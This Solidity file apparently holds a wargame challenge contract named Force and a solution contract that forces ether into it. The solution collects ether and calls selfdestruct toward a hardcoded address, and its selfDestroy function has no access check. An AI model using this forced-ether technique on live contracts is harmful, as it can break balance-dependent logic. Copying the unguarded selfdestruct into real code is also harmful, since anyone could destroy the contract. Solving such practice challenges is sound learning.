pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract SelfDestructingContract {
    function collect() public payable returns(uint){
        return address(this).balance;
    }
    
    function selfDestroy() public{
        address addr = 0xe31bb7428d328060fc8a80a7616eddde36765a04;
        selfdestruct(addr);
    }
}

